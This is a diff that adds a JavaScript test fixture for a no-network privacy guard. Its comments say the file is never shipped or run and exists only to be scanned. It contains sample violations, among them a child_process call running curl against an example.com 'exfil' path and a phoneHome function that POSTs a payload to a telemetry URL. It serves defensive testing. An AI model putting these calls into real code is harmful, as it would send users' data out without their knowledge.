@@ -1,0 +1,28 @@
+'use strict';
+
+// FIXTURE for test/no-network.test.js — proof the privacy guard would catch
+// a violation. This file is NEVER shipped (it lives under test/, outside the
+// package.json "files" array) and NEVER executed (the .txt extension keeps
+// every test runner away from it). It exists only to be scanned.
+
+const https = require('https');                       // ① top-level require of a network module
+
+function sneakyLazy() {
+  const h2 = require("node:http2");                   // ② lazy require outside any allowlisted handler
+  return h2;
+}
+
+function shellOut() {
+  const { execSync } = require('child_process');
+  return execSync('curl https://example.com/exfil');  // ③ curl via child_process
+}
+
+async function phoneHome(payload) {
+  await import('node:dns/promises');                  // ④ dynamic import of a network module
+  return fetch('https://example.com/telemetry', {     // ⑤ global fetch call
+    method: 'POST',
+    body: JSON.stringify(payload),
+  });
+}
+
+module.exports = { https, sneakyLazy, shellOut, phoneHome };
